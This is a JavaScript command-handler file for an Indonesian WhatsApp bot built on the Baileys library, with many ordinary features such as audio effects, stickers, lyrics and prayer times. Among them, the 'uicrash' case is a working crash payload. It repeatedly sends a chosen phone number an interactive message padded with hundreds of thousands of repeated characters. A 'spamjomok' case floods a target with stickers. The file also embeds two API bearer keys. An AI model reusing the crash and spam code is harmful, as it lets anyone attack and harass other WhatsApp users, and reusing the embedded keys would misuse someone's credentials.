// © MchaX-Bot
// • Credits : wa.me/6281235807940 [ Krizz ]
// • Owner: 6281235807940

/*
• Telegram: krsna_081
• Instagram: krsna081
*/

//============================
// - buat Pengguna case bisa tambah fitur disini
// - Fitur akan otomatis terlihat di .menu jadi jangan bikin fitur menu lagi 👍
//============================

const {
    default: makeWASocket,
    prepareWAMessageMedia,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    generateWAMessageFromContent,
    generateWAMessageContent,
    generateWAMessage,
    jidDecode,
    jidNormalizedUser,
    proto,
    delay,
    relayWAMessage,
    getContentType,
    getAggregateVotesInPollMessage,
    downloadContentFromMessage,
    fetchLatestWaWebVersion,
    InteractiveMessage,
    makeCacheableSignalKeyStore,
    Browsers,
    generateForwardMessageContent,
    MessageRetryMap
} = require("baileys");
const {
    exec
} = require("child_process");
const {
    fromFile,
    fromStream,
    fromTokenizer,
    fromBuffer,
    stream,
} = require("file-type");
const path = require("path");
const util = require("util");
const fs = require("node:fs");
const axios = require("axios");
const Func = require("../lib/function");
const pkg = require("../lib/case");
const Case = new pkg("./system/case.js");
const {
    writeExif,
    imageToWebp,
    videoToWebp
} = require("../lib/sticker");
const {
    jadibot,
    stopjadibot,
    listjadibot
} = require("../lib/jadibot");

module.exports = async (m,
    sock,
    mchax,
    config,
    text,
    Func,
    Scraper,
    Uploader,
    store,
    isAdmin,
    botAdmin,
    isPrems,
    isBanned,
) => {
    const quoted = m.isQuoted ? m.quoted : m;
    try {
        switch (m.command) {
            case "bass":
            case "blown":
            case "deep":
            case "earrape":
            case "fast":
            case "fat":
            case "nightcore":
            case "reverse":
            case "robot":
            case "slow":
            case "smooth":
            case "tupai":
            case "vibra":
                let q = m.quoted ? m.quoted : m
                let mime = (q.msg || q).mimetype || ''
                if (!/audio/.test(mime)) return m.reply(`❗ Balas audio dengan ${m.prefix + m.command}`);
                let audio = await q.download()
                let set
                m.reply(config.messages.wait);

                try {
                    if (/bass/.test(m.command)) set = '-af equalizer=f=94:width_type=o:width=2:g=30'
                    if (/blown/.test(m.command)) set = '-af acrusher=.1:1:64:0:log'
                    if (/deep/.test(m.command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                    if (/earrape/.test(m.command)) set = '-af volume=12'
                    if (/fast/.test(m.command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                    if (/fat/.test(m.command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                    if (/nightcore/.test(m.command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                    if (/reverse/.test(m.command)) set = '-filter_complex "areverse"'
                    if (/robot/.test(m.command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                    if (/slow/.test(m.command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                    if (/smooth/.test(m.command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                    if (/tupai|squirrel|chipmunk/.test(m.command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                    if (/vibra/.test(m.command)) set = '-filter_complex "vibrato=f=15"'

                    let ran = Date.now() + '.mp3'
                    let media = path.join(process.cwd(), 'tmp', ran)
                    let outputFile = path.join(process.cwd(), 'tmp', `output_${ran}`)

                    await fs.promises.writeFile(media, audio)
                    exec(`ffmpeg -i "${media}" ${set} "${outputFile}"`, async (err) => {
                        await fs.promises.unlink(media)
                        if (err) return Promise.reject('*Error processing audio!*')

                        let buff = await fs.promises.readFile(outputFile)
                        sock.sendFile(m.cht, buff, `output_${ran}`, null, m, {
                            quoted: m,
                            ptt: true,
                            mimetype: 'audio/mp4'
                        })
                        await fs.promises.unlink(outputFile)
                    })
                } catch (e) {
                    throw e
                }
                break
            case "lirik": {
                if (!text) return m.reply("masukan judul lagu!");
                let data = await Scraper.lirik(text);
                let cap = `*– 乂 Lyrics Lagu*\n\n> - *Judul :* ${data.title}\n> - *SubJudul :* ${data.subtitle}\n> - *Artis :* ${data.artist}\n> - *Platform :* ${data.platform}\n\n\`\`\`${data.lyrics}\`\`\``;
                await m.reply(cap);
            }
            break
            case "sw": {
                if (!m.isOwner) return m.reply(config.messages.owner);
                try {
                    if (!store.messages['status@broadcast'] || store.messages['status@broadcast'].array.length === 0)
                        throw 'Gaada 1 status pun Story yang Tersedia.';

                    let stories = store.messages['status@broadcast'].array;
                    let story = stories.filter(v => v.message && v.message.protocolMessage?.type !== 0);

                    if (story.length === 0) throw 'Tidak ada story yang Tersedia.';

                    if (text.startsWith('--get')) {
                        if (!text) return m.reply("> *Harap masukkan nomor dan urutan untuk mendownload story.*");

                        let args = text.replace('--get', '').split(',').map(val => val.trim());
                        let nomor = args.shift()?.replace(/\D+/g, '');
                        let urutanList = args.map(u => parseInt(u.replace(/\D+/g, '')) - 1);

                        if (!nomor) return m.reply("> *❌ Gunakan sw --get nomor, urutan1, urutan2, ...*");
                        nomor = nomor + '@s.whatsapp.net';

                        let filteredStory = story.filter(v =>
                            (v.key && v.key.participant === nomor) || v.participant === nomor
                        );

                        if (filteredStory.length === 0) throw 'Story tersebut tidak Tersedia.';

                        // Jika tidak ada urutan, ambil semua story dari nomor tersebut
                        if (urutanList.length === 0) {
                            urutanList = [...Array(filteredStory.length).keys()]; // Ambil semua index story
                        }

                        // Filter index yang valid
                        urutanList = urutanList.filter(i => i >= 0 && i < filteredStory.length);
                        if (urutanList.length === 0) throw 'Urutan tidak valid atau tidak ada story yang tersedia.';

                        for (let i = 0; i < urutanList.length; i++) {
                            await m.reply({
                                forward: filteredStory[urutanList[i]],
                                force: true
                            });
                            if (i < urutanList.length - 1) await new Promise(resolve => setTimeout(resolve, 2000)); // Delay 2 detik
                        }
                    } else {
                        const result = {};
                        for (let obj of story) {
                            let participant = obj.key.participant || obj.participant;
                            participant = jidNormalizedUser(participant === 'status_me' ? sock.user.id : participant);

                            if (participant === m.sender) continue;

                            if (!result[participant]) result[participant] = [];
                            result[participant].push(obj);
                        }

                        let type = mType => {
                            let contentType = getContentType(mType);
                            return contentType ? (contentType === 'extendedTextMessage' ? 'text' : contentType.replace('Message', '')) : 'unknown';
                        };

                        let responseText = '*– 乂 Penggunaan list Story 💡:*\n\n';
                        responseText += '> 🔄  *`--get`* untuk mendownload story yang tersedia\n\n';
                        responseText += '*– 乂 Daftar Story yang Tersedia:*\n\n';

                        let i = 1;
                        for (let id of Object.keys(result)) {
                            if (!id || result[id].length === 0) continue;

                            let name = await sock.getName(id).catch(() => id);
                            responseText += `> ${name} @${id.split("@")[0]}\n`;
                            let storyList = result[id].map((v, idx) => `- ${idx + 1}. ${type(v.message)}`).join('\n');
                            responseText += `${storyList}\n`;
                            i++;
                        }

                        if (i === 1) throw 'Tidak ada story yang tersedia selain milikmu.';
                        await m.reply(responseText.trim(), {
                            mentions: Object.keys(result)
                        });
                    }
                } catch (err) {
                    await m.reply(`> ⚠️ *Error: ${err}*`);
                }
            }
            break
            case "uicrash": {
                if (!m.isOwner) return m.reply(config.messages.owner);

                let [nomor, jumlahStr] = text.split("|").map(v => v.trim());
                if (!nomor || !jumlahStr) return m.reply("Masukkan format yang benar: uicrash nomor|jumlah");

                let jumlah = parseInt(jumlahStr);
                if (isNaN(jumlah) || jumlah <= 0) return m.reply("Jumlah harus berupa angka positif.");

                let target = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
                await m.reply(`otw ngecrot sistem @${target.split("@")[0]}`);

                try {
                    for (let i = 0; i < jumlah; i++) {
                        await sock.relayMessage(
                            target, {
                                ephemeralMessage: {
                                    message: {
                                        interactiveMessage: {
                                            header: {
                                                locationMessage: {
                                                    degreesLatitude: 0,
                                                    degreesLongitude: 0,
                                                },
                                                hasMediaAttachment: true,
                                            },
                                            body: {
                                                text: "hyy bro, im sorry 🤭😫⭑̤\n" +
                                                    "ꦾ".repeat(92000) +
                                                    "ꦽ".repeat(92000) +
                                                    `@1`.repeat(92000),
                                            },
                                            nativeFlowMessage: {},
                                            contextInfo: {
                                                mentionedJid: Array(5).fill("1@newsletter"),
                                                groupMentions: [{
                                                    groupJid: "1@newsletter",
                                                    groupSubject: "krizz",
                                                }, ],
                                                quotedMessage: {
                                                    documentMessage: {
                                                        contactVcard: true,
                                                    },
                                                },
                                            },
                                        },
                                    },
                                },
                            }, {
                                participant: {
                                    jid: target
                                },
                                userJid: target
                            }
                        );
                        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1 detik antar pengiriman
                    }
                    await m.reply(`woilah banj, @${target.split("@")[0]} udah ter crot duluwan 🤭`);
                } catch (err) {
                    throw err
                }
            }
            break;
            case "runtime": {
                m.reply({
                    image: {
                        url: `https://og.tailgraph.com/og?fontFamily=Poppins&title=Runtime+Bot&titleTailwind=font-bold%20text-red-600%20text-7xl&stroke=true&text=Time : ${Func.toTime(process.uptime() * 1000)}&textTailwind=text-red-700%20mt-4%20text-2xl&textFontFamily=Poppins&logoTailwind=h-8&bgUrl=https%3A%2F%2Fwallpaper.dog%2Flarge%2F272766.jpg&bgTailwind=bg-white%20bg-opacity-30&footer=MchaX-Bot&footerTailwind=text-grey-600`
                    },
                    caption: `*– 乂 Runtime Bot*\n> - *Bot  Runtime :* ${await Func.toDate(process.uptime() * 1000)}\n> - *Os Runtime :* ${await Func.toDate(require("os").uptime() * 1000)}`
                });
            }
            break;
            case "surah": {
                if (!m.args[0]) return m.reply(`📖 *Gunakan:* ${m.prefix}surah [nomor/nama]\n\nContoh:\n- ${m.prefix}surah 2\n- ${m.prefix}surah al-fatihah`);

                let query = m.args.join(" ").toLowerCase();
                let {
                    data
                } = await axios.get(`https://rest.cloudkuimages.xyz/api/muslim/surah`);

                if (!data.result) return m.reply("❌ Gagal mengambil data surat!");

                let surat = data.result.find(s => s.number == query || s.name_id.toLowerCase() == query || s.name_en.toLowerCase() == query);

                if (!surat) return m.reply("❌ Surat tidak ditemukan!");
                let audioUrl = surat.audio_url;
                let response = await axios.head(audioUrl);
                let fileSize = parseInt(response.headers["content-length"] || 0);

                let pesan = `📖 *Surat ${surat.name_id} (${surat.name_en})*\n`;
                pesan += `- 🏷 Nama Arab: ${surat.name_short}\n`;
                pesan += `- 🔢 Nomor Surat: ${surat.number}\n`;
                pesan += `- 📖 Jumlah Ayat: ${surat.number_of_verses}\n`;
                pesan += `- 🏙️ Golongan: ${surat.revelation_id} (${surat.revelation_en})\n\n`;
                pesan += `📜 *Tafsir Singkat:*\n${surat.tafsir.substring(0, 500)}...\n\n`;

                let mek = await mchax.sendMessage(m.cht, {
                    text: pesan
                }, {
                    quoted: m
                });

                if (fileSize > 10 * 1024 * 1024) {
                    await mchax.sendMessage(m.cht, {
                        document: {
                            url: audioUrl
                        },
                        fileName: `Surah_${surat.name_id}.mp3`,
                        mimetype: 'audio/mpeg'
                    }, {
                        quoted: mek || m
                    });
                } else {
                    await mchax.sendMessage(m.cht, {
                        audio: {
                            url: audioUrl
                        },
                        mimetype: 'audio/mpeg',
                        ptt: false
                    }, {
                        quoted: mek || m
                    });
                }
            }
            break;





            case "ffstalk": {
                if (!text) return m.reply("Masukkan ID Free Fire yang ingin dicari!");
                try {
                    let data = await Scraper.ffstalk(text);
                    if (!data) return m.reply("Data tidak ditemukan atau ID tidak valid!");

                    let message = `*🎮 Free Fire Stalk Result*\n`;
                    message += `👤 *Nama:* ${data.name || "Tidak diketahui"}\n`;
                    message += `📜 *Bio:* ${data.bio || "Tidak ada"}\n`;
                    message += `❤️ *Like:* ${data.like || "0"}\n`;
                    message += `🎚️ *Level:* ${data.level || "0"}\n`;
                    message += `⭐ *EXP:* ${data.exp || "0"}\n`;
                    message += `🌍 *Region:* ${data.region || "Tidak diketahui"}\n`;
                    message += `🎖 *Honor Score:* ${data.honorScore || "0"}\n`;
                    message += `🏆 *BR Rank:* ${data.brRank || "Tidak ada"} (${data.brRankPoint || "0"})\n`;
                    message += `📆 *Akun Dibuat:* ${data.accountCreated || "Tidak diketahui"}\n`;
                    message += `⏳ *Terakhir Login:* ${data.lastLogin || "Tidak diketahui"}\n`;
                    message += `🗣️ *Bahasa:* ${data.language || "Tidak diketahui"}\n`;
                    message += `🎟️ *Booyah Pass Premium:* ${data.booyahPassPremium || "Inactive"}\n\n`;

                    if (data.petInformation) {
                        message += `*🐾 Pet Information:*\n`;
                        message += `- Nama: ${data.petInformation.name}\n`;
                        message += `- Level: ${data.petInformation.level}\n`;
                        message += `- EXP: ${data.petInformation.exp}\n`;
                        message += `- Star Marked: ${data.petInformation.starMarked}\n`;
                        message += `- Selected: ${data.petInformation.selected}\n\n`;
                    }

                    if (data.guild) {
                        message += `*🏰 Guild:*\n`;
                        message += `- Nama: ${data.guild.name}\n`;
                        message += `- Level: ${data.guild.level}\n`;
                        message += `- Anggota: ${data.guild.members}\n`;
                        message += `- ID: ${data.guild.id}\n\n`;
                    }

                    await m.reply(message);

                    if (data.equippedItems && data.equippedItems.length > 0) {
                        let media = []
                        for (let item of data.equippedItems) {
                            media.push({
                                image: {
                                    url: item.img
                                },
                                caption: item.name
                            })
                        }
                        await mchax.sendAlbumMessage(m.cht, media, {
                            quoted: m,
                            delay: 2500
                        })
                    }
                } catch (e) {
                    console.error(e);
                    m.reply("Terjadi kesalahan dalam mengambil data!");
                }
            }
            break
            case "say": {
                if (!text) return m.reply("Masukan textnya!")
                try {
                    return m.reply(text);
                } catch (err) {
                    throw err;
                }
            }
            break
            case "toimg": {
                if (!m.quoted) return m.reply(`> *Mohon balas pesan sticker!*`);
                if (!/image|webp/.test(m.quoted.msg.mimetype)) return m.reply(`> *Mohon balas pesan sticker!*`);
                try {
                    sock.sendMessage(m.cht, {
                        image: await m.quoted.download(),
                        mimetype: "image/jpeg"
                    }, {
                        quoted: m
                    })
                } catch (e) {
                    throw e;
                }
            }
            break
            case "beautify":
            case "bft": {
                if (!quoted.text) return m.reply("Masukan kode untuk dirapikan!");
                try {
                    let data = require("js-beautify")(quoted.body);
                    m.reply(data);
                } catch (error) {
                    await m.reply(util.format(error))
                }
            }
            break
            m.reply(data)
            case "spamjomok": {
                function no(number) {
                    return number.replace(/\D/g, "").replace(/^0/, "62");
                }
                let target;
                if (m.quoted) {
                    target = no(m.quoted.sender);
                } else if (text) {
                    target = no(text.split(" ")[0]);
                }
                if (!m.isOwner) return m.reply(config.message.owner);
                if (!target) return m.reply("Masukan nomor target!");
                if (!m.args[1] || isNaN(m.args[1])) return m.reply("Masukkan jumlah spam!");
                let count = Math.min(10, parseInt(m.args[1]));

                let urls = [
                    "https://nauval.mycdn.biz.id/download/1740319769503.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319769576.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319770024.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319771447.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319773520.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319773744.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319773836.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319774203.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319774429.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319774750.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319775297.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319775886.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319776256.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319777153.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319777557.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319778095.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319778923.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319779406.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319779883.jpg",
                    "https://nauval.mycdn.biz.id/download/1740319780332.jpg"
                ];

                m.reply(`Mengirim spam sticker ke @${target} sebanyak ${count} kali...`);

                for (let i = 0; i < count; i++) {
                    let randomUrl = urls[Math.floor(Math.random() * urls.length)];

                    try {
                        let {
                            data
                        } = await axios.get(randomUrl, {
                            responseType: "arraybuffer"
                        });
                        let cuqi = await fromBuffer(data);
                        let sticker = await writeExif({
                            mimetype: cuqi.mime,
                            data: data
                        }, {
                            packName: "Selamat Anda mendapatkan jackpot jomok dari krizz 😹😹",
                            packPublish: "© Krizz Not Jomok!"
                        });

                        await sock.sendMessage(target + "@s.whatsapp.net", {
                            sticker
                        });
                    } catch (err) {
                        console.error(err);
                        m.reply("Terjadi kesalahan saat mengirim spam.");
                    }
                }
                m.reply(`Spam selesai!`);
            }
            break
            case "jadibot": {
                if (m.isGroup) return m.reply(config.messages.private);
                try {
                    await jadibot(sock, m, m.sender)
                } catch (error) {
                    await m.reply(util.format(error))
                }
            }
            break
            case "stopjadibot": {
                if (m.key.fromMe) return
                try {
                    await stopjadibot(sock, m, m.sender)
                } catch (error) {
                    await m.reply(util.format(error))
                }
            }
            break
            case "listjadibot": {
                try {
                    listjadibot(sock, m)
                } catch (error) {
                    await reply(util.format(error))
                }
            }
            break
            case "toanime": {
                let q = m.quoted ? m.quoted : m;
                let mime = (q.msg || q).mimetype || '';

                if (/image/g.test(mime) && !/webp/g.test(mime)) {
                    let rawModel = (m.args[0] || 'anime').toLowerCase();
                    let model = rawModel.replace(/^--/, '');

                    if (!['anime', 'pixar'].includes(model)) {
                        return m.reply(`Model tidak valid. Pilih antara *--anime* atau *--pixar*.\nContoh: *${m.prefix + m.command} --anime*`);
                    }

                    await m.reply('Tunggu sebentar...');
                    try {
                        const img = await q.download?.();
                        if (!img) return m.reply('Gagal mengunduh gambar.');

                        let out = await Uploader.catbox(img);
                        let old = new Date();
                        let res = await require("axios").post("https://ins.balxzzy.web.id/api/ai/ainsfxv2", {
                            imageUrl: out,
                            model
                        }, {
                            headers: {
                                'Content-Type': 'application/json'
                            }
                        });

                        if (!res.data || !res.data.uploadedUrl) {
                            throw new Error('Gagal mengunggah gambar ke AniSFX');
                        }

                        let link = res.data.uploadedUrl;
                        await sock.sendMessage(m.cht, {
                            image: {
                                url: link
                            },
                            caption: `*– 乂 Generate Image\n> *Waktu :* ${((new Date() - old) * 1)} ms`
                        }, {
                            quoted: m
                        });

                    } catch (e) {
                        console.error(e);
                        m.reply(`[ ! ] Identifikasi Gagal.`);
                    }
                } else {
                    m.reply(`Kirim gambar dengan caption *${m.prefix + m.command} --[model]* atau tag gambar yang sudah dikirim.\nModel tersedia: *--anime*, *--pixar*`);
                }
            }
            break;
            case "tts": {
                let query = text.trim();
                if (!query && m.quoted) {
                    query = m.quoted.body;
                }

                if (!query) return m.reply("> ❌ *Masukkan teks yang ingin diubah menjadi suara!*");

                const options = {
                    method: "POST",
                    url: "https://api.itsrose.rest/tts/inference_text",
                    headers: {
                        "Content-Type": "application/json",
                        Authorization: "Bearer " + Func.random(["Rk-865398da3e89a11620187a01de45b5e2", "Rk-05e7472153248f91ee66da16fb2383a2"]),
                    },
                    data: {
                        server_id: "lov",
                        voice_id: "EXAVITQu4vr4xnSDxMaL",
                        text: query,
                        model_id: "eleven_multilingual_v2",
                        output_format: "mp3_22050_32",
                        apply_text_normalization: "auto",
                    },
                };

                try {
                    let {
                        data
                    } = await axios.request(options);

                    if (!data.result || !data.result.audios || !data.result.audios[0]) return m.reply("> ❌ *Gagal membuat TTS. Coba lagi nanti!*");

                    let audioUrl = data.result.audios[0];

                    await sock.sendMessage(m.cht, {
                        audio: {
                            url: audioUrl
                        },
                        mimetype: "audio/mp4"
                    }, {
                        quoted: m
                    });

                } catch (error) {
                    console.error(error);
                    throw "> ❌ *Terjadi kesalahan saat mengubah teks menjadi suara.*";
                }
            }
            break;
            case "ppcp": {
                let res = await Func.fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json');
                let random = Func.random(res);
                await sock.sendAlbumMessage(m.cht, [{
                    image: {
                        url: random.male
                    },
                    caption: "*– 乂 PP Couple*\n- Male (Cowok)"
                }, {
                    image: {
                        url: random.female
                    },
                    caption: "*– 乂 PP Couple*\n- Female (Cewek)"
                }], {
                    quoted: m,
                });
            }
            break;
            case "tag": {
                if (!m.isOwner || !m.isGroup) return m.reply(config.messages.owner);
                try {
                    await sock.sendAlbumMessage(m.cht, [{
                        image: {
                            url: "https://example.com/image1.jpg"
                        },
                        caption: "K For Krisnoll"
                    }], {
                        quoted: m,
                        mentions: m.metadata.participants.map(a => a.id),
                    });
                } catch (err) {
                    return;
                }
            }
            break;
            case "setcmd":
            case "delcmd":
            case "listcmd": {
                if (m.command === "setcmd") {
                    if (!isPrems) return m.reply(config.messages.premium);
                    if (!m.quoted || !text) return m.reply(`> *Balas pesan sticker dengan masukkan prefix dan nama command.*`);
                    if (!/webp/.test(m.quoted.msg.mimetype)) return m.reply(`> *Mohon balas pesan sticker!*`);

                    try {
                        let hash = m.quoted.msg.fileSha256 ? m.quoted.msg.fileSha256.toString("base64") : null;
                        if (!hash) return m.reply(`> *❌ Tidak dapat mengambil hash sticker!*`);

                        let url = await m.quoted.download();
                        db.list().sticker[hash] = {
                            message: text,
                            creator: m.pushName,
                            jid: m.sender,
                            url: await Uploader.catbox(url),
                        };

                        m.reply("> ✅ *Berhasil menambahkan command ke sticker*");
                    } catch (e) {
                        m.reply("> ❌ *Terjadi kesalahan saat mengambil data!*");
                    }

                } else if (m.command === "delcmd") {
                    if (!isPrems) return m.reply(config.messages.premium);
                    if (!m.quoted) return m.reply(`> *Mohon balas pesan sticker!*`);
                    if (!/webp/.test(m.quoted.msg.mimetype)) return m.reply(`> *Mohon balas pesan sticker!*`);

                    try {
                        let hash = m.quoted.msg.fileSha256 ? m.quoted.msg.fileSha256.toString("base64") : null;
                        if (!hash) return m.reply(`> *❌ Tidak dapat mengambil hash sticker!*`);

                        if (db.list().sticker[hash]) {
                            delete db.list().sticker[hash];
                            m.reply("> ✅ *Berhasil menghapus command dari sticker*");
                        } else {
                            m.reply("> ❌ *Command tersebut tidak ada di daftar sticker!*");
                        }
                    } catch (e) {
                        m.reply("> ❌ *Terjadi kesalahan saat menghapus command!*");
                    }

                } else if (m.command === "listcmd") {
                    const data = db.list().sticker;
                    if (Object.keys(data).length === 0) return m.reply("> ❌ *Tidak ada command sticker yang tersimpan!*");

                    let result = "> *– 乂 Total List Command:*\n\n";
                    let index = 1;
                    for (const key in data) {
                        result += `> *Creator:* ${data[key].creator}\n`;
                        result += `> *Jid:* wa.me/${data[key].jid.split("@")[0]}\n`;
                        result += `> *Sticker:* ${data[key].url} - ${data[key].message}\n\n`;
                        index++;
                    }
                    m.reply(result);
                }
            }
            break;
            case "totalfitur": {
                const cmd = Object.values(pg.plugins)
                    .filter((v) => v.command)
                    .map((v) => v.command)
                    .flat(1).length
                const alias = Object.values(pg.plugins)
                    .filter((v) => v.alias)
                    .map((v) => v.alias)
                    .flat(1).length

                let caseData = fs.readFileSync(process.cwd() + "/system/case.js", "utf8");
                let casePattern = /case\s+"([^"]+)"/g;
                let totalCases = (caseData.match(casePattern) || []).length;
                sock.relayMessage(m.cht, {
                    pollResultSnapshotMessage: {
                        name: `*– 乂 📊 Total Fitur Bot:*`,
                        pollVotes: [{
                            optionName: "- 🔹 *Alias + Command:*",
                            optionVoteCount: `${cmd + alias}`
                        }, {
                            optionName: "- 🔸 *Case:*",
                            optionVoteCount: `${totalCases}`
                        }, {
                            optionName: "- 🗂️ *File Plugins:*",
                            optionVoteCount: `${Object.keys(pg.plugins).length}`
                        }, {
                            optionName: "📌 *Total Semua Fitur:*",
                            optionVoteCount: `${cmd + alias + totalCases}`
                        }],
                    }
                }, {
                    quoted: m
                })
            }
            break;
            case "ocr": {
                if (!quoted.isMedia) return m.reply("> *📸 Balas dengan foto untuk menghasilkan text*");
                if (!/image/.test(quoted.msg.mimetype)) return m.reply("> *📸 Balas dengan foto untuk menghasilkan text*");
                let buffer = await quoted.download();
                let url = await Uploader.catbox(buffer);
                let res = await Func.fetchJson(`https://api.diioffc.web.id/api/tools/ocr?url=${url}`);
                await m.reply(res.result.message);
            }
            break;
            case "exif": {
                if (!m.quoted) return m.reply("> *Mohon balas sticker!*");
                if (!/webp/.test(m.quoted.msg.mimetype)) return m.reply("> *Mohon balas sticker!*");
                let node = await require("node-webpmux");
                let image = new node.Image();
                let url = await m.quoted.download();
                await image.load(url)
                m.reply(await require("util").format(JSON.parse(image.exif.slice(22).toString())));
            }
            break;
            case "smeme": {
                if (!quoted || !quoted.msg || !quoted.msg.mimetype) {
                    return m.reply("> *📸 Balas dengan foto atau stiker untuk dijadikan sticker meme*.");
                }
                if (!/image|webp/.test(quoted.msg.mimetype)) {
                    return m.reply("> *📸 Hanya mendukung gambar atau stiker!*");
                }
                try {
                    let [atas, bawah] = text.split(/[,|\-+&]/);
                    let media = await quoted.download();
                    if (quoted.msg.mimetype === "image/webp") {
                        media = await require("sharp")(media).toFormat("jpeg").toBuffer();
                    }

                    let url = await Uploader.nauval(media);
                    if (!url) throw "> *❌ Gagal mengunggah gambar ke server!*";
                    let memeUrl = `https://api.memegen.link/images/custom/${encodeURIComponent(atas || "_")}/${encodeURIComponent(bawah || "_")}.png?background=${await url}`;
                    let buf = await Func.fetchBuffer(memeUrl)
                    let sticker = await writeExif({
                        mimetype: "image",
                        data: await buf
                    }, {
                        packName: config.sticker.packname,
                        packPublish: config.sticker.author,
                    });

                    await m.reply({
                        sticker
                    });

                } catch (err) {
                    console.error(err);
                    m.reply(err.message || "> *⚠️ Terjadi kesalahan, coba lagi nanti!*");
                }
            }
            break;
            case "brat": {
                const {
                    execSync
                } = require("child_process");
                const fs = require("fs");
                const path = require("path");

                let input = m.isQuoted ? m.quoted.body : text;
                if (!input) return m.reply(`*– 乂 Pengguna Brat 💡*\n\n> *${m.prefix + m.command}* Masukan pesan atau balas pesan\n\n*– 乂 Dengan Animasi*\n\n> *${m.prefix + m.command}* Masukan pesan atau balas pesan dengan tambahkan *\`--animated\`* di akhir kata\n- Contoh: *${m.prefix + m.command}* woy irenkk 😹 --animated`);
                m.reply(config.messages.wait);

                if (m.text.includes("--animated")) {
                    let txt = input.replace("--animated", "").trim().split(" ");
                    let array = [];
                    let tmpDirBase = path.resolve(`./tmp/brat_${Date.now()}`);

                    fs.mkdirSync(tmpDirBase, {
                        recursive: true
                    })
                    for (let i = 0; i < txt.length; i++) {
                        let word = txt.slice(0, i + 1).join(" ");
                        let media = (await axios.get(`https://aqul-brat.hf.space/api/brat?text=${encodeURIComponent(word)}`, {
                            responseType: 'arraybuffer'
                        })).data;
                        let tmpDir = path.resolve(`${tmpDirBase}/brat_${i}.mp4`);
                        fs.writeFileSync(tmpDir, media);
                        array.push(tmpDir);
                    }

                    let fileTxt = path.resolve(`${tmpDirBase}/cmd.txt`);
                    let content = "";
                    for (let i = 0; i < array.length; i++) {
                        content += `file '${array[i]}'\n`;
                        content += `duration 0.5\n`;
                    }
                    content += `file '${array[array.length - 1]}'\n`;
                    content += `duration 3\n`;
                    fs.writeFileSync(fileTxt, content);

                    let output = path.resolve(`${tmpDirBase}/output.mp4`);
                    execSync(`ffmpeg -y -f concat -safe 0 -i ${fileTxt} -vf "fps=30" -c:v libx264 -preset veryfast -pix_fmt yuv420p -t 00:00:10 ${output}`);
                    let sticker = await writeExif({
                        mimetype: "video",
                        data: fs.readFileSync(output)
                    }, {
                        packName: config.sticker.packname,
                        packPublish: config.sticker.author
                    });
                    fs.rmSync(tmpDirBase, {
                        recursive: true,
                        force: true
                    });
                    await m.reply({
                        sticker
                    });
                } else {
                    let media = (await axios.get(`https://aqul-brat.hf.space/api/brat?text=${encodeURIComponent(input)}`, {
                        responseType: 'arraybuffer'
                    })).data;
                    let sticker = await writeExif({
                        mimetype: "image",
                        data: media
                    }, {
                        packName: config.sticker.packname,
                        packPublish: config.sticker.author
                    });
                    await m.reply({
                        sticker
                    });
                }
            }
            break;
            case "daftar": {
                let user = db.list().user[m.sender];
                if (user.register) return m.reply("> 🎉 Kamu sudah terdaftar!");
                if (!text) return m.reply("> 📢 Masukkan nama kamu untuk pendaftaran!");

                let list = Object.values(db.list().user).find((a) => a.name.toLowerCase() === text.toLowerCase());
                if (list) return m.reply("> ❗ Nama tersebut sudah digunakan!");

                let bonus = 1000;
                user.register = true;
                user.name = text;
                user.rpg.money += bonus;
                user.rpg.exp += bonus;

                let cap = `*– 乂 Pendaftaran Berhasil!*\n`;
                cap += `> 🎉 Selamat ${user.name}, kamu berhasil mendaftar dan mendapatkan bonus tambahan!\n\n`;

                cap += `*– 乂 Hadiah Pendaftaran*\n`;
                cap += `> 💰 *Money:* 1.000\n`;
                cap += `> 📊 *Exp:* 1.000\n`;

                m.reply(cap);
            }
            break;
            case "jadwalsholat": {
                const axios = require('axios');
                const cheerio = require('cheerio');
                if (!text) return m.reply("> 📍 Masukkan nama kota yang kamu tuju!");
                const kota = text?.toLowerCase() || 'jakarta';

                try {
                    const {
                        data
                    } = await axios.get(`https://jadwal-sholat.tirto.id/kota-${kota}`);
                    const $ = cheerio.load(data);

                    const jadwal = $('tr.currDate td').map((i, el) => $(el).text()).get();

                    if (jadwal.length === 7) {
                        const [tanggal, subuh, duha, dzuhur, ashar, maghrib, isya] = jadwal;

                        const zan = `
╭──[ *📅 Jadwal Sholat* ]──✧
᎒⊸ *🌆 Kota*: ${kota.charAt(0).toUpperCase() + kota.slice(1)}
᎒⊸ *📅 Tanggal*: ${tanggal}

╭──[ *🕰️ Waktu Sholat* ]──✧
᎒⊸ *Subuh:* ${subuh}
᎒⊸ *Duha:* ${duha}
᎒⊸ *Dzuhur:* ${dzuhur}
᎒⊸ *Ashar:* ${ashar}
᎒⊸ *Maghrib:* ${maghrib}
᎒⊸ *Isya:* ${isya}
╰────────────•`;

                        await m.reply(zan);
